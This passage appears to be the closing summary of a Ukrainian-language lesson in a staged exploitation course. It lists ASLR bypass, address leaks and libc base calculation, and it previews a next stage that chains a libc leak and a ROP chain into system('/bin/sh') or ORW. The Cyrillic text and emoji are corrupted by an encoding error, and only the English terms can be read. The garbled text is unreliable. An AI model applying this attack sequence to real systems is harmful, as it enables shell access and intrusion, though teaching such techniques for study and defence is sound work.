**–ö–ª—é—á–æ–≤—ñ –ø–æ–Ω—è—Ç—Ç—è:** ASLR, leak, libc base calculation, dlsym

## üéØ –ù–∞—Å—Ç—É–ø–Ω–∏–π –∫—Ä–æ–∫: Stage 08

–¢–µ–ø–µ—Ä –≤–∏ –≤–º—ñ—î—Ç–µ:
1. ‚úÖ BOF (Stage 06)
2. ‚úÖ Leak –∞–¥—Ä–µ—Å (Stage 07)

–£ **Stage 08** –ø–æ—î–¥–Ω–∞—î–º–æ –æ–±–∏–¥–≤—ñ —Ç–µ—Ö–Ω—ñ–∫–∏:
- Leak libc ‚Üí –†–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –±–∞–∑—É ‚Üí ROP chain ‚Üí `system("/bin/sh")` –∞–±–æ **ORW**!
